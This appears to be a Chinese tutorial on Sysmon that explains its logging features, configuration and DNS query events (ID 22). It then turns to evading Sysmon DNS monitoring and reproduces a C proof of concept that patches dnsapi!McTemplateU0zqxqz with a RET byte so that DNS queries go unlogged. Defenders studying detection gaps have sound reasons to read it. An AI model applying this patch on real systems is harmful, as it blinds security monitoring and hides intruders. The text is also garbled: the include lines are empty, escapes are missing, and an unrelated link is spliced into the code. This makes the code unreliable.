Sysmon简介
Sysmon是⼀个Windows系统服务和设备驱动程序，安装后，会在系统启动时保持驻留状态，实时监视和记录系统
活动，并记录在Windows事件⽇志中。它提供有关进程创建，⽹络连接，⽂件创建时间更改等详细信息。
我们可以通过对Sysmon记录的事件⽇志进⾏分析，并了解⼊侵者和恶意软件如何在⽤⼾⽹络上运⾏。
Sysmon功能概述
（1）使⽤完整的命令⾏记录当前⾏为的⽗进程的进程创建；
（2）使⽤SHA1（默认值），MD5，SHA256或IMPHASH记录过程映像⽂件的哈希；
（3）可以同时使⽤多个哈希；
（4）在进程创建事件中包含进程GUID，即使Windows重⽤进程ID时也可以使事件相关；
（5）在每个事件中都包含⼀个会话GUID，以允许在同⼀登录会话上关联事件；
（6）使⽤签名和哈希记录驱动程序或DLL的加载；
（7）⽇志打开以进⾏磁盘和卷的原始读取访问；
（8）（可选）记录⽹络连接，包括每个连接的源进程，IP地址，端⼝号，主机名和端⼝名。
（9）检测⽂件创建时间的更改，以了解真正创建⽂件的时间。修改⽂件创建时间戳是恶意软件通常⽤来掩盖其踪
迹的技术；
（10）如果注册表中发⽣更改，则⾃动重新加载配置；
（11）规则过滤以动态包括或排除某些事件；
（12）从启动过程的早期开始⽣成事件，以捕获甚⾄复杂的内核模式恶意软件进⾏的活动
Sysmon下载
Sysmon下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon
配置⽂件下载地址：https://github.com/SwiftOnSecurity/sysmon-config
Sysmon安装
更新配置⽂件:
Sysmon⽇志分析
Sysmon的事件⽇志需要在Windows事件查看器中查看：
Sysmon事件⽇志的存储路径为：
应用程序和服务日志/ Microsoft / Windows / Sysmon / Operational
分析域名解析对应的程序:
对Sysmon的事件⽇志进⾏筛选，筛选事件ID为“22”的事件，表⽰DNS查询事件
这样即可对应发出DNS请求的程序。
sysmon.exe -c sysmonconfig-export.xml
SysmonDNS监控规避
参考@_xpn的博⽂：https://blog.xpnsec.com/evading-sysmon-dns-monitoring/
Sysmon会⼤量依赖ETW来监控各种⾏为，搜索关键字定位的函数其实就是启⽤了⼀个provider
https://docs.microsoft.com/en-us/windows/win32/etw/example-that-creates-a-session-and-enables-a-m
anifest-based-provider
DnsQuery_A 这个API在 DnsApi.dll 导出，其中会发出事件，以供注册的DNS事件provider记录。
调⽤堆栈如下，最终调⽤ McGenEventWrite ，详细的windbg分析查看xpn原⽂即可。
事件会从 DnsApi.dll 内部发出，并且由于该DLL会在我们可控的进程内调⽤。所以，我们可以⼲预，⽂章在运⾏
时patch DNSAPI!McTemplateU0zqxqz ，使其不通过 EtwEventWriteTransfer 发送相关事件，直接返回。
POC如下，在执⾏起来搜索 dnsapi.dll 中的 McTemplateU0zqxqz 这个API的位置，然后更改第⼀个值为RET使
其直接返回。
#include 
#include 
#include 
// Pattern for hunting dnsapi!McTemplateU0zqxqz
#define PATTERN (unsigned char*)"x48x89x5cx24x08x44x89x4cx24x20x55x48x8dx6c"
#define PATTERN_LEN 14
// Search for pattern in memory
DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen) {
    ULONG offset = 0;
    for (int i = 0; i < 0x200000; i++) {
        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == 
signature[1]) {
            if (memcmp(mem + i, signature, signatureLen) == 0) {
                // Found the signature
                offset = i;
                break;
            }
        }
    }
    return offset;
}
int main()
{
    DWORD oldProtect, oldOldProtect;
    printf("DNS Sysmon Bypass POCn      by @_xpn_nn");
    unsigned char *dll = (unsigned char *)LoadLibraryA("dnsapi.dll");
    if (dll == (void*)0) {
        printf("[x] Could not load dnsapi.dlln");
        return 1;
    }
    DWORD patternOffset = SearchPattern(dll, PATTERN, PATTERN_LEN);
其他学习⽂档：
ETW：https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal
    printf("[*] Pattern found at offset %dn", patternOffset);
    printf("[*] Patching with RETn");
    VirtualProtect(dll + patternOffset, 10, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(dll + patternOffset) = 0xc3;
    VirtualProtect(dll, 10, oldProtect, &oldOldProtect);
    printf("[*] Sending DNS Query... should now not be detectedn");
    DnsQuery_A("blog.xpnsec.com", DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, NULL, NULL);
}